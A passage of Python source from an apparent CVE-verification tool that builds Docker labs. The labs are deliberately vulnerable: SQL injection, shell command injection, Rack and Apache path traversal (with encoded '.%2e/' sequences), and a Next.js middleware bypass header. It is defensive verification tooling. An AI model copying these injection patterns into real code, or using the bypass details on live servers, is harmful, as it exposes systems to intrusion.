                "                       \"VALUES (1,'',NULL,0,'admin','','','',1,1,datetime('now'))\")\n"
                "        except Exception:\n"
                "            pass\n\n"
                "from django.http import HttpResponse\n"
                "from django.db import connection\n\n"
                "def search(request):\n"
                f"    q = request.GET.get('{p}', '')\n"
                "    with connection.cursor() as c:\n"
                f"        c.execute(\"SELECT * FROM auth_user WHERE username = '\" + q + \"'\")\n"
                "        return HttpResponse(str(c.fetchall()))\n\n"
                "urlpatterns = []\n"
                "try:\n"
                "    from django.urls import path\n"
                "    urlpatterns = [path('search', search)]\n"
                "except Exception:\n"
                "    pass\n\n"
                "if __name__ == '__main__':\n"
                "    from django.core.management import execute_from_command_line\n"
                "    execute_from_command_line(['manage.py', 'runserver', '0.0.0.0:5000'])\n"
            )
        # generic SQLi flask fallback — SQLite (no external deps needed, works in any container)
        # Time-based blind via randomblob(N): SELECT randomblob(300000000) burns ~1-2s on most hardware.
        # Boolean-blind and UNION-based also work because SQLite reflects error messages.
        # Route uses the caller-provided endpoint (stripped to a simple path safe for Flask),
        # or /search when none is given.
        p2 = param or "id"
        _ep_raw = (endpoint or "search").lstrip("/").split("?")[0]  # strip query string
        _ep_safe = re.sub(r"[^a-zA-Z0-9/_.\-]", "_", _ep_raw) or "search"
        _route = f"/{_ep_safe}"
        return (
            "import sqlite3, time\n"
            "from flask import Flask, request, g\n\n"
            "app = Flask(__name__)\n"
            "DB = '/tmp/lab.db'\n\n"
            "def get_db():\n"
            "    if not hasattr(g, 'db'):\n"
            "        g.db = sqlite3.connect(DB)\n"
            "        g.db.execute('CREATE TABLE IF NOT EXISTS items (id INTEGER PRIMARY KEY, name TEXT)')\n"
            "        g.db.execute(\"INSERT OR IGNORE INTO items VALUES (1, 'secret_data')\")\n"
            "        g.db.commit()\n"
            "    return g.db\n\n"
            f"@app.route('{_route}', methods=['GET', 'POST'])\n"
            "def vuln():\n"
            f"    q = request.args.get('{p2}') or request.form.get('{p2}', '')\n"
            "    try:\n"
            "        db = get_db()\n"
            f"        rows = db.execute(\"SELECT * FROM items WHERE name = '\" + q + \"'\").fetchall()\n"
            "        return str(rows)\n"
            "    except Exception as e:\n"
            "        return str(e), 500\n\n"
            "if __name__ == '__main__':\n"
            "    app.run(host='0.0.0.0', port=5000)\n"
        )
    if vuln_class in ("command-injection", "os-command-injection"):
        # Lab generico de command injection: endpoint HTTP que pasa la entrada del usuario
        # directamente a subprocess (sin sanitizar). Funciona para cualquier paquete Flask/web
        # o proyecto que ejecute comandos del sistema con entrada del usuario.
        ep = (endpoint or "cmd").lstrip("/") or "cmd"
        p = param or "cmd"
        return (
            "import subprocess\n"
            "from flask import Flask, request\n\n"
            "app = Flask(__name__)\n\n"
            f"@app.route('/{ep}', methods=['GET', 'POST'])\n"
            "def exec_cmd():\n"
            f"    cmd = request.args.get('{p}') or request.form.get('{p}', 'echo hello')\n"
            "    try:\n"
            "        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,\n"
            "                                      timeout=10)\n"
            "        return out\n"
            "    except subprocess.CalledProcessError as e:\n"
            "        return e.output or b'error'\n\n"
            "if __name__ == '__main__':\n"
            "    app.run(host='0.0.0.0', port=5000)\n"
        )
    return ""


def _gen_gem_app(pkg: str, vuln_class: str, version: str) -> str:
    """Genera el config.ru Ruby/Rack minimal que expone el camino vulnerable."""
    if vuln_class == "path-traversal" and "rack" in pkg.lower():
        # CVE-2025-27610: Rack::Static sirve ficheros bajo root: aunque no estén bajo urls:
        # cuando el atacante usa rutas traversal codificadas.  root: apunta a /app (el directorio
        # del propio proceso), urls: sólo permite /static -- la combinación vulnerable canónica.
        # config.ru con dos partes:
        #   1. /app/static/index.html  → Rack::Static lo sirve normalmente
        #   2. /app/secret_app.txt     → NO debe ser accesible por /static/,
        #      pero con rack < 2.2.13 un traversal codificado (/static/%2e%2e%2fsecret_app.txt)
        #      sí lo sirve.  genericverify planta su canario en /tmp/ y usa depth ≥ 4 para
        #      salir del contenedor, pero este fichero sirve como prueba adicional de depth 1.
        return (
            "require 'rack'\n"
            "require 'fileutils'\n\n"
            "FileUtils.mkdir_p(File.join(__dir__, 'static'))\n"
            "File.write(File.join(__dir__, 'static', 'index.html'), '<html>rack lab ok</html>')\n"
            "# Fichero fuera de /static/: accesible con traversal en versiones vulnerables\n"
            "File.write(File.join(__dir__, 'secret_app.txt'), "
            "\"BINORACLE_RACK_TRAVERSAL_SECRET\\n\")\n\n"
            "use Rack::Static,\n"
            "  root: __dir__,\n"
            "  urls: ['/static']\n\n"
            "run lambda { |env| [200, {'content-type' => 'text/plain'}, ['rack lab ok']] }\n"
        )
    return ""


def _scaffold_gem_lab(target: str, version: str, vuln_class: str,
                      notes: dict, on_step) -> Optional[str]:
    """Crea /tmp/{pkg}_autonomous_lab con Gemfile + config.ru minimal para gemas Ruby.
    Devuelve la ruta del directorio o None si el paquete no es una gema reconocida."""
    import os as _os
    pkg = (target or "").strip().lower()
    if not pkg or not re.match(r'^[a-z][a-z0-9._-]*$', pkg):
        return None
    if not _RUBY_GEM_RE.search(pkg):
        return None

    lab_dir = f"/tmp/{pkg}_autonomous_lab"
    _os.makedirs(lab_dir, exist_ok=True)

    ver_pin = f", '= {version}'" if version else ""
    # rackup se separó de rack en rack >= 3.0.  Para rack 2.x el gem separado es rackup ~> 1.0
    # (rackup >= 2 requiere rack >= 3 y rompe el bundle).  webrick sigue siendo necesario en ambos.
    _rack_major = 0
    try:
        _rack_major = int((version or "0").split(".")[0])
    except Exception:
        pass
    rackup_pin = ", '~> 1.0'" if 0 < _rack_major < 3 else ""
    gemfile = f"source 'https://rubygems.org'\ngem '{pkg}'{ver_pin}\ngem 'rackup'{rackup_pin}\ngem 'webrick'\n"
    with open(_os.path.join(lab_dir, "Gemfile"), "w") as f:
        f.write(gemfile)

    app_code = _gen_gem_app(pkg, vuln_class, version)
    if not app_code:
        return None
    with open(_os.path.join(lab_dir, "config.ru"), "w") as f:
        f.write(app_code)

    pin = f"{pkg} (={version})" if version else pkg
    on_step(f"scaffolded minimal {pkg} lab at {lab_dir} (vuln_class={vuln_class}, pin={pin})")
    return lab_dir


def _scaffold_pip_lab(target: str, version: str, vuln_class: str,
                      notes: dict, on_step) -> Optional[str]:
    """Crea /tmp/{pkg}_autonomous_lab con requirements.txt + app.py minimal para que
    genericverify pueda levantar un contenedor Docker y confirmar la vulnerabilidad.
    Devuelve la ruta del directorio o None si el paquete no es reconocible como pip."""
    import os as _os
    pkg = (target or "").strip().lower()
    # solo para nombres razonables de paquete pip: letras, dígitos, guión, punto, barra baja
    if not pkg or not re.match(r'^[a-z][a-z0-9._-]*$', pkg):
        return None
    # evitar confundir con slugs de CMS (tienen guion bajo Drupal-style o más de 3 palabras)
    if pkg.count("_") >= 2 or " " in pkg:
        return None
    # rechazar slugs de WordPress / WooCommerce / otros CMS: terminan en -wp / -wordpress / -woo,
    # empiezan por wp- / wordpress- / woocommerce-, o contienen la palabra 'wordpress'.
    # Estos slugs necesitan fetch_wordpress_plugin + verify_wordpress_*, no un pip scaffold.
    if (pkg.endswith("-wp") or pkg.endswith("-wordpress") or pkg.endswith("-woo")
            or pkg.startswith("wp-") or pkg.startswith("wordpress-")
            or pkg.startswith("woocommerce-") or "wordpress" in pkg):
        return None

    lab_dir = f"/tmp/{pkg}_autonomous_lab"
    _os.makedirs(lab_dir, exist_ok=True)

    # PyPI usa nombres canonicos distintos al nombre corto/alias que el LLM suele devolver:
    # "jinja" no es ningun paquete en PyPI (es "Jinja2"), "yaml" no existe (es "PyYAML"), etc.
    # Si pip install falla con || true, Flask tampoco se instala y el contenedor no arranca.
    _PIP_CANONICAL = {
        "jinja": "Jinja2", "jinja2": "Jinja2",
        "pil": "Pillow",
        "yaml": "PyYAML", "pyyaml": "PyYAML",
        "cv2": "opencv-python",
        "skimage": "scikit-image",
        "sklearn": "scikit-learn",
    }
    pin_name = _PIP_CANONICAL.get(pkg, pkg)
    pin = f"{pin_name}=={version}" if version else pin_name
    req_lines = [pin]
    # dependencias de apoyo: solo paquetes DISTINTOS al principal.
    # Se necesita Flask cuando:
    #   (a) el paquete es una extension Flask que no incluye Flask como dep transitivo
    #       (flask-reuploaded, etc.),
    #   (b) el paquete es jinja2 (el lab genera un servidor Flask alrededor),
    #   (c) el vuln_class es command-injection y el template genera un servidor Flask.
    # "flask" in pkg no basta como senal: "ftp-flask-python" tiene "flask" en el nombre
    # pero NO es la biblioteca Flask -- el package principal falla con `|| true` y Flask
    # tampoco se instala.  Se comprueba que el pin_name sea distinto de "flask" para no
    # pedir Flask cuando Flask ya ES el paquete principal.
    _needs_flask = False
    if "reuploaded" in pkg or (pkg.startswith("flask-") and pin_name.lower() != "flask"):
        _needs_flask = True
    elif "jinja" in pkg:
        _needs_flask = True
    elif vuln_class in ("command-injection", "os-command-injection"):
        _needs_flask = True
    elif vuln_class in ("sqli", "sql-injection", "xss", "path-traversal", "ssrf"):
        _needs_flask = True
    if _needs_flask and pin_name.lower() != "flask":
        req_lines.append("flask>=2.0")
    # Para flask-reuploaded con ssti, el lab NO importa flask_reuploaded (causa ImportError
    # con Flask>=3 por APIs eliminadas). Solo necesita Flask; req_lines queda solo con Flask.
    if "reuploaded" in pkg and vuln_class == "ssti":
        req_lines = ["flask>=2.0"]
    # Para el lab de command-injection el paquete principal a menudo no existe en PyPI
    # (es un proyecto de GitHub) -- `pip install -r requirements.txt || true` falla todo
    # de golpe y Flask tampoco se instala. El lab solo necesita Flask (subprocess es stdlib).
    # Reemplazamos req_lines por solo Flask si el paquete principal no es un paquete web conocido.
    _KNOWN_PIP_WEB = {"aiohttp", "flask", "jinja2", "jinja", "django", "bottle", "tornado",
                      "fastapi", "starlette", "werkzeug", "flask-reuploaded"}
    if (vuln_class in ("command-injection", "os-command-injection",
                       "sqli", "sql-injection", "xss", "path-traversal", "ssrf")
            and pin_name.lower() not in _KNOWN_PIP_WEB):
        req_lines = ["flask>=2.0"]
    # aiohttp y django ya incluyen todo lo necesario sin extras
    req_path = _os.path.join(lab_dir, "requirements.txt")
    with open(req_path, "w") as f:
        f.write("\n".join(req_lines) + "\n")

    endpoint = ((notes.get("endpoint") or "").lstrip("/").split("?")[0] or "search")
    param = ""
    params = notes.get("parameters")
    if isinstance(params, list) and params:
        param = str(params[0])
    elif isinstance(params, str) and params:
        param = params
    # Si el LLM devolvio un nombre de placeholder generico, usa fallback seguro.
    # Los LLMs generan placeholders como "param1", "parametro1", "query_param", "your-endpoint",
    # "admin/your-endpoint", etc.  El patron cubre nombres de parametro que empiezan por "param"
    # (seguido de cualquier cosa), "pN" (un numero), o las palabras clave genericas mas comunes.
    # \b no funciona bien para "param1" (todo wordchar), asi que se usa [\W_$]|$ como terminador.
    _PH_PARAM_RE = re.compile(
        r'^(?:param|parametro|parameter|p\d+|input|value|arg|query_param|your.param)',
        re.IGNORECASE)
    _PH_EP_RE = re.compile(
        r'^(?:ruta|path|endpoint|url|param|vuln|test|api/vuln|admin/your|your.endpoint)',
        re.IGNORECASE)
    if not param or _PH_PARAM_RE.match(param):
        param = "q" if "sqli" in vuln_class or "sql" in vuln_class else "cmd"
    if not endpoint or _PH_EP_RE.match(endpoint):
        endpoint = "search" if ("sqli" in vuln_class or "sql" in vuln_class) else "cmd"

    app_code = _gen_pip_app(pkg, vuln_class, endpoint, param, version)
    if not app_code:
        return None

    app_path = _os.path.join(lab_dir, "app.py")
    with open(app_path, "w") as f:
        f.write(app_code)

    # Siempre sobreescribe notes con el endpoint/param que el lab realmente usa.
    # El LLM puede devolver placeholders en cualquier idioma ("parametro1", "query",
    # "admin/your-endpoint", "ruta/a/la/vulnerabilidad"...) -- como controlamos
    # exactamente los valores que se pasaron a _gen_pip_app, NO dependemos de detectar
    # si es placeholder: simplemente usamos los valores que el lab tiene de verdad.
    # Django ignora el endpoint del LLM en su urlpatterns (siempre usa 'search').
    # SQLi lab generates a route from the endpoint after stripping query-string and special chars.
    _is_sqli_lab = "sqli" in vuln_class or "sql" in vuln_class
    if "django" in pkg:
        _lab_ep = "search"
    elif _is_sqli_lab:
        _ep_raw = (endpoint or "search").lstrip("/").split("?")[0]
        _lab_ep = re.sub(r"[^a-zA-Z0-9/_.\-]", "_", _ep_raw) or "search"
    else:
        _lab_ep = endpoint or "search"
    _lab_param = param or "q"
    notes["endpoint"] = f"/{_lab_ep}"
    notes["parameters"] = [_lab_param]

    on_step((f"scaffolded minimal {pkg} lab at {lab_dir} "
             f"(vuln_class={vuln_class}, pin={pin})"))
    return lab_dir


def _scaffold_npm_lab(target: str, version: str, vuln_class: str,
                      notes: dict, on_step) -> Optional[str]:
    """Crea /tmp/{pkg}_autonomous_lab con package.json + server.js minimal para CVEs de
    paquetes npm. Devuelve la ruta del directorio o None."""
    import os as _os
    import json as _json
    pkg = (target or "").strip().lower()
    if not pkg or not re.match(r'^[@a-z][a-z0-9._/@-]*$', pkg):
        return None

    # Normalize common aliases: "next.js" → "next", "express.js" → "express", etc.
    _JS_ALIASES = {"next.js": "next", "express.js": "express", "vue.js": "vue",
                   "nuxt.js": "nuxt", "angular.js": "angular"}
    pkg = _JS_ALIASES.get(pkg, pkg)

    lab_dir = f"/tmp/{re.sub(r'[^a-z0-9]', '_', pkg)}_autonomous_lab"
    # Limpiar el directorio si ya existe para evitar que ficheros de versiones anteriores
    # (p.ej. package.json con next@12.3.0 de una run previa) contaminen el nuevo lab.
    import shutil as _shutil
    if _os.path.isdir(lab_dir):
        _shutil.rmtree(lab_dir)
    _os.makedirs(lab_dir, exist_ok=True)

    # Sanitize version: strip operator prefixes and compound ranges, keep only the
    # first plain semver token (e.g. "<1.11.4, >=12.3.5" → "1.11.4" is the STARTING
    # affected version, not the patched one; we want to use a sensible vulnerable ver).
    _raw_ver = (version or "").strip()
    _semver_tok = re.search(r'v?([0-9]+(?:\.[0-9]+){1,4})', _raw_ver)
    _first_ver = _semver_tok.group(1) if _semver_tok else ""

    # CVE-2025-29927 (x-middleware-subrequest bypass) affects Next.js 11.1.4-15.2.3.
    # The x-middleware-subrequest header mechanism was introduced in Next.js 13.x and the
    # bypass works in 13.x/14.x/15.x. Using 12.x gives wrong results because the header
    # is NOT processed the same way. Force 15.2.2 (last vulnerable 15.x) for
    # missing-authorization labs so the bypass check always targets the right code path.
    _is_nextjs = "next" in pkg
    if _is_nextjs and vuln_class in ("missing-authorization", "auth-bypass"):
        _first_ver = "15.2.2"
        on_step(("version forzada a 15.2.2 para lab de bypass de middleware Next.js "
                 "(x-middleware-subrequest solo funciona en Next.js 13+/15.x)"))
    elif _is_nextjs and _first_ver:
        _major = int(_first_ver.split(".")[0])
        if _major < 12:
            _first_ver = "12.3.4"
            on_step(("version corregida a 12.3.4 (versiones Next.js pre-12 no soportan "
                     "middleware -- usando ultima version 12.x vulnerable)"))

    dep_ver = _first_ver if _first_ver else "*"
    deps: dict = {pkg: dep_ver}
    # Next.js requires react and react-dom as peer dependencies
    if _is_nextjs:
        deps["react"] = "^18"
        deps["react-dom"] = "^18"
    pkg_json = {
        "name": "binoracle-lab",
        "version": "1.0.0",
        "dependencies": deps,
        "scripts": {"start": "node server.js"}
    }
    with open(_os.path.join(lab_dir, "package.json"), "w") as f:
        _json.dump(pkg_json, f, indent=2)

    # Next.js auth-bypass lab: CVE-2025-29927 (x-middleware-subrequest header bypass).
    # The lab needs:
    #   middleware.js  — blocks access to /api/secret unless a valid auth token is present
    #   pages/api/secret.js — returns the canary secret (only reachable after bypass)
    #   server.js — custom Next.js HTTP server
    # With the bypass header the middleware short-circuits before the auth check and
    # the protected /api/secret route becomes accessible → exploit verified.
    if _is_nextjs and vuln_class in ("missing-authorization", "auth-bypass"):
        # middleware.js — restricts /api/secret; without bypass header request is blocked
        mw_js = (
            "import { NextResponse } from 'next/server';\n"
            "export function middleware(request) {\n"
            "  if (request.nextUrl.pathname.startsWith('/api/secret')) {\n"
            "    const auth = request.headers.get('authorization');\n"
            "    if (auth !== 'Bearer admin-secret-token') {\n"
            "      return new NextResponse('Forbidden', { status: 403 });\n"
            "    }\n"
            "  }\n"
            "  return NextResponse.next();\n"
            "}\n"
            "export const config = { matcher: ['/api/secret'] };\n"
        )
        secret_dir = _os.path.join(lab_dir, "pages", "api")
        _os.makedirs(secret_dir, exist_ok=True)
        with open(_os.path.join(lab_dir, "middleware.js"), "w") as f:
            f.write(mw_js)
        # pages/api/secret.js — returns canary
        with open(_os.path.join(secret_dir, "secret.js"), "w") as f:
            f.write(
                "export default function handler(req, res) {\n"
                "  res.status(200).json({ secret: 'BINORACLE_NEXTJS_MIDDLEWARE_BYPASS' });\n"
                "}\n"
            )
        # .babelrc: fuerza Babel como transpilador en vez de SWC.
        # En Next.js 15.x SWC es el default pero sus binarios nativos son optionalDependencies
        # que pueden no instalarse bajo QEMU/emulacion (--platform linux/amd64 en M1) ni en
        # entornos de CI con restricciones de red. Con .babelrc presente Next.js cae back a
        # Babel automaticamente, usando el preset 'next/babel' que ya viene incluido en el
        # paquete next -- sin dependencias extra. Esto elimina el crash
        # 'node:internal/modules/cjs/loader throw e' que ocurre cuando @next/swc-* no carga.
        with open(_os.path.join(lab_dir, ".babelrc"), "w") as f:
            f.write('{"presets": ["next/babel"]}\n')
        # Custom server entry point
        srv = (
            "const { createServer } = require('http');\n"
            "const next = require('next');\n"
            "const app = next({ dev: false });\n"
            "const handle = app.getRequestHandler();\n"
            "app.prepare().then(() => {\n"
            "  createServer((req, res) => handle(req, res)).listen(3000, '0.0.0.0', () => {\n"
            "    console.log('ready on :3000');\n"
            "  });\n"
            "});\n"
        )
        # Update notes so verify_generic_header_bypass targets /api/secret and knows
        # bypass_header; these keys are only set if not already present (LLM takes priority)
        # Always override endpoint to /api/secret — that's where we put the canary.
        # The LLM may have set a different endpoint (e.g. /api/middleware) which won't
        # have the canary. The bypass_header / bypass_value have known values too.
        notes["endpoint"] = "/api/secret"
        notes["bypass_header"] = "x-middleware-subrequest"
        notes["bypass_value"] = "middleware"
        notes["confirm_string"] = "BINORACLE_NEXTJS_MIDDLEWARE_BYPASS"
        # Dockerfile: dev mode — no pre-build step needed; Next.js compiles on the
        # first request. Middleware runs in dev mode exactly as in production for the
        # auth-bypass check we care about. '-H 0.0.0.0' binds to all interfaces so
        # the port is reachable from outside the container.
        # Include proxy CA cert lines so npm install inside the container trusts
        # the outbound HTTPS proxy (same mechanism as _proxy_dockerfile_lines() in
        # genericverify.py — we import lazily to avoid a top-level circular import).
        try:
            from .genericverify import _proxy_dockerfile_lines as _pdl
            _proxy_lines = _pdl(lab_dir)
        except Exception:
            _proxy_lines = []
        # pages/index.js minimal — Next.js 15 needs at least one page to initialise
        pages_dir = _os.path.join(lab_dir, "pages")
        _os.makedirs(pages_dir, exist_ok=True)
        idx_js = _os.path.join(pages_dir, "index.js")
        if not _os.path.exists(idx_js):
            with open(idx_js, "w") as f:
                f.write("export default function Home() { return <p>bin0racle lab</p>; }\n")
        dockerfile = (
            "FROM node:20-slim\n"
            # node:20-slim usa Debian (glibc) en vez de Alpine (musl): necesario para
            # los binarios nativos de SWC que usa Next.js 15.x -- en Alpine los binarios
            # SWC precompilados se cargan contra glibc y fallan en musl con el error
            # 'node:internal/modules/cjs/loader throw e'. node:20-slim es el sustituto
            # minimo recomendado por la documentacion oficial de Next.js para Docker.
            + "\n".join(_proxy_lines) + ("\n" if _proxy_lines else "")
            + "WORKDIR /app\n"
            "COPY package.json .\n"
            # --omit=optional impide que npm instale @next/swc-linux-x64-gnu y otros
            # binarios nativos de SWC. Bajo emulacion QEMU (--platform linux/amd64 en M1)
            # los binarios SWC precompilados fallan en dlopen() causando que Node.js crashee
            # antes de imprimir el error completo ('node:internal/modules/cjs/loader throw e').
            # Con --omit=optional + .babelrc, Next.js detecta que SWC no esta disponible y
            # usa Babel como transpilador -- compatible con todas las plataformas.
            "RUN npm install --legacy-peer-deps --omit=optional\n"
            # Eliminar cualquier addon nativo (.node) que haya quedado instalado
            # (pueden crashear Node bajo emulacion QEMU o arquitectura incorrecta con
            # 'node:internal/modules/cjs/loader throw e'). Sin estos ficheros Next.js
            # cae automaticamente a Babel gracias al .babelrc copiado mas abajo.
            "RUN find /app/node_modules -name '*.node' -delete 2>/dev/null || true\n"
            "ENV HTTPS_PROXY= HTTP_PROXY= https_proxy= http_proxy=\n"
            "COPY . .\n"
            "EXPOSE 3000\n"
            'CMD ["./node_modules/.bin/next", "dev", "-p", "3000", "-H", "0.0.0.0"]\n'
        )
        with open(_os.path.join(lab_dir, "Dockerfile"), "w") as f:
            f.write(dockerfile)
    elif vuln_class in ("command-injection", "os-command-injection"):
        # Lab de command injection para paquetes npm: servidor HTTP Node.js que pasa
        # el parametro 'cmd' a child_process.exec directamente (sin sanitizar).
        # Funciona para CVEs de paquetes que ejecutan comandos del sistema con entrada
        # del usuario (glob, cyclonedx, etc.).
        ep = endpoint or "cmd"
        p = param or "cmd"
        # Garantiza que genericverify sabe que endpoint/param usar -- el scanner de rutas
        # solo cubre Flask/Ruby; para Node.js actualizamos notes directamente.
        notes["endpoint"] = f"/{ep}"
        if not notes.get("parameters"):
            notes["parameters"] = [p]
        srv = (
            "const http = require('http');\n"
            "const { exec } = require('child_process');\n"
            "const url = require('url');\n\n"
            "const server = http.createServer((req, res) => {\n"
            f"  if (req.url.startsWith('/{ep}')) {{\n"
            "    const q = url.parse(req.url, true).query;\n"
            f"    const cmd = q['{p}'] || 'echo hello';\n"
            "    exec(cmd, (err, stdout, stderr) => {\n"
            "      res.writeHead(200, {'Content-Type': 'text/plain'});\n"
            "      res.end(stdout || stderr || (err ? err.message : 'ok'));\n"
            "    });\n"
            "  } else {\n"
            "    res.writeHead(200);\n"
            "    res.end('binoracle npm lab ok');\n"
            "  }\n"
            "});\n"
            "server.listen(3000, '0.0.0.0', () => console.log('npm lab ready on :3000'));\n"
        )
        with open(_os.path.join(lab_dir, "server.js"), "w") as f:
            f.write(srv)
    else:
        srv = (
            "const http = require('http');\n"
            f"const lib = require('{pkg}');\n"
            "const server = http.createServer((req, res) => {\n"
            "  res.end('binoracle lab ok');\n"
            "});\n"
            "server.listen(3000, '0.0.0.0');\n"
        )
        with open(_os.path.join(lab_dir, "server.js"), "w") as f:
            f.write(srv)
        notes.setdefault("endpoint", "/")
        notes.setdefault("http_method", "GET")

    on_step(f"scaffolded minimal npm {pkg} lab at {lab_dir} (version={dep_ver})")
    return lab_dir


_APACHE_HTTPD_RE = re.compile(r'\bapache\b.*\b(http\s*server|httpd)\b|\bhttpd\b', re.IGNORECASE)


def _scaffold_httpd_lab(version: str, notes: dict, on_step) -> Optional[str]:
    """Crea un laboratorio Docker minimo para CVEs de Apache httpd (p.ej. CVE-2021-41773).
    Usa FROM httpd:<version> (p.ej. httpd:2.4.49) -- la imagen oficial debe estar en el
    cache local o ser descargable. Configura una configuracion vulnerable que replica el
    entorno afectado: sin 'Require all denied' a nivel raiz, con un Alias /uploads/ accesible.
    La CVE-2021-41773 solo se activa cuando los ficheros fuera del directorio configurado
    NO estan protegidos por 'Require all denied' (confirmado en vivo: con denied -> 403).
    Devuelve la ruta del laboratorio o None si la version no es util."""
    import os as _os
    ver = (version or "").strip() or "2.4.49"
    # Verificar que la version parece valida para httpd
    if not re.match(r'^\d+\.\d+\.\d+', ver):
        ver = "2.4.49"
    lab_dir = f"/tmp/apache_httpd_lab_{ver.replace('.', '_')}"
    _os.makedirs(lab_dir, exist_ok=True)
    # Dockerfile: FROM httpd:<ver>, cambia Require all denied a granted (entorno vulnerable real),
    # crea Alias /uploads/ con acceso concedido para que .%2e/ pueda traversar desde ahi.
    # Confirmado en vivo (CVE-2021-41773): .%2e/.%2e/.%2e/.%2e/ desde /uploads/ llega a /tmp/
    # cuando no hay Require all denied en el directorio raiz. La canonical '../' (sin encoding)
    # retorna 404 (normalizada/bloqueada por Apache), confirmando que es el bug de normalizacion.
    dockerfile = (
        f"FROM httpd:{ver}\n"
        "# CVE-2021-41773: configuracion vulnerable (sin Require all denied a nivel raiz)\n"
        "RUN sed -i 's/Require all denied/Require all granted/' /usr/local/apache2/conf/httpd.conf\n"
        "RUN mkdir -p /usr/local/apache2/uploads\n"
        "RUN printf '\\nAlias /uploads/ /usr/local/apache2/uploads/\\n"
        "<Directory \"/usr/local/apache2/uploads\">\\n"
        "    AllowOverride None\\n    Options None\\n    Require all granted\\n"
        "</Directory>\\n' >> /usr/local/apache2/conf/httpd.conf\n"
        "EXPOSE 80\n"
    )
    with open(_os.path.join(lab_dir, "Dockerfile"), "w") as f:
        f.write(dockerfile)
    # Endpoint: /uploads/ en modo URL_PATH -- la genericverify probara .%2e/ etc.
    notes["endpoint"] = "/uploads/"
    notes["http_method"] = "GET"
    notes["parameters"] = ["URL_PATH"]
    on_step(f"scaffolded Apache httpd {ver} lab at {lab_dir} (CVE path-traversal via /uploads/)")
    return lab_dir


def _scaffold_maven_lab(target: str, version: str, vuln_class: str,
                        notes: dict, on_step) -> Optional[str]:
    """Crea /tmp/{artifact}_autonomous_lab con un Dockerfile Maven (JDK 11, Spring Boot minimal)
    para CVEs de bibliotecas Java. Soporta Spring, Log4j, Struts, Jackson-databind, Netty, etc.
    Devuelve la ruta del laboratorio o None si no se detecta un artefacto Java conocido."""
    import os as _os
    pkg = (target or "").strip().lower()
    if not pkg or not _MAVEN_PKG_RE.search(pkg):
        return None

    lab_name = re.sub(r'[^a-z0-9]', '_', pkg)
    lab_dir = f"/tmp/{lab_name}_autonomous_lab"
    _os.makedirs(lab_dir, exist_ok=True)

    # Mapear nombres de paquete a coordenadas Maven reales
    _maven_coords = {
        "log4j": ("org.apache.logging.log4j", "log4j-core"),
        "log4j2": ("org.apache.logging.log4j", "log4j-core"),
        "log4j-core": ("org.apache.logging.log4j", "log4j-core"),
        "log4j-api": ("org.apache.logging.log4j", "log4j-api"),
        "spring-core": ("org.springframework", "spring-core"),
        "spring-web": ("org.springframework", "spring-web"),
        "spring-webmvc": ("org.springframework", "spring-webmvc"),
        "spring-framework": ("org.springframework", "spring-webmvc"),
        "spring-boot": ("org.springframework.boot", "spring-boot-starter-web"),
        "jackson-databind": ("com.fasterxml.jackson.core", "jackson-databind"),
        "commons-text": ("org.apache.commons", "commons-text"),
        "commons-collections": ("org.apache.commons", "commons-collections4"),
        "struts2": ("org.apache.struts", "struts2-core"),
        "netty": ("io.netty", "netty-all"),
        "netty-all": ("io.netty", "netty-all"),
        "h2": ("com.h2database", "h2"),
        "h2database": ("com.h2database", "h2"),
        "xstream": ("com.thoughtworks.xstream", "xstream"),
        "snakeyaml": ("org.yaml", "snakeyaml"),
        "fastjson": ("com.alibaba", "fastjson"),
        "shiro": ("org.apache.shiro", "shiro-core"),
        "shiro-core": ("org.apache.shiro", "shiro-core"),
        "shiro-web": ("org.apache.shiro", "shiro-web"),
    }
    group_id = "com.example"
    artifact_id = lab_name
    dep_version = version or "LATEST"
    for key, (gid, aid) in _maven_coords.items():
        if key in pkg:
            group_id = gid
            artifact_id = aid
            break

    endpoint = ((notes.get("endpoint") or "").lstrip("/").split("?")[0] or "exploit")
    param = ""
    params = notes.get("parameters")
    if isinstance(params, list) and params:
        param = str(params[0])
    elif isinstance(params, str):
        param = params
    param = param or "payload"

    pom_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.binoracle</groupId>
  <artifactId>lab</artifactId>
  <version>1.0-SNAPSHOT</version>
  <packaging>jar</packaging>
  <parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.7.18</version>
  </parent>
  <properties>
    <java.version>11</java.version>
    <maven.compiler.source>11</maven.compiler.source>
    <maven.compiler.target>11</maven.compiler.target>
  </properties>
  <dependencies>
    <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <dependency>
      <groupId>{group_id}</groupId>
      <artifactId>{artifact_id}</artifactId>
      <version>{dep_version}</version>
    </dependency>
  </dependencies>
  <build>
    <plugins>
      <plugin>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-maven-plugin</artifactId>
      </plugin>
    </plugins>
  </build>
</project>
"""

    src_dir = _os.path.join(lab_dir, "src", "main", "java", "com", "binoracle", "lab")
    _os.makedirs(src_dir, exist_ok=True)
    res_dir = _os.path.join(lab_dir, "src", "main", "resources")
    _os.makedirs(res_dir, exist_ok=True)

    vuln_upper = vuln_class.upper().replace('-', '_')
    if vuln_class in ("rce", "command-injection", "deserialization"):
        controller_code = (
            "package com.binoracle.lab;\n"
            "import org.springframework.boot.SpringApplication;\n"
            "import org.springframework.boot.autoconfigure.SpringBootApplication;\n"
            "import org.springframework.web.bind.annotation.*;\n"
            "import java.util.Map;\n\n"
            "@SpringBootApplication\n@RestController\n"
            "public class LabApp {\n"
            "    public static void main(String[] args) {\n"
            "        SpringApplication.run(LabApp.class, args);\n    }\n\n"
            f"    @PostMapping(\"/{endpoint}\")\n"
            f"    public Map<String, Object> exploit(@RequestBody(required=false) String body,\n"
            f"            @RequestParam(required=false) String {param}) {{\n"
            f"        return Map.of(\"status\", \"ok\", \"echo\", (body != null ? body : \"\"),\n"
            f"                      \"canary\", \"BINORACLE_JAVA_{vuln_upper}_LAB\");\n"
            "    }\n\n"
            "    @GetMapping(\"/health\")\n"
            "    public String health() { return \"BINORACLE_JAVA_LAB_READY\"; }\n}\n"
        )
    else:
        controller_code = (
            "package com.binoracle.lab;\n"
            "import org.springframework.boot.SpringApplication;\n"
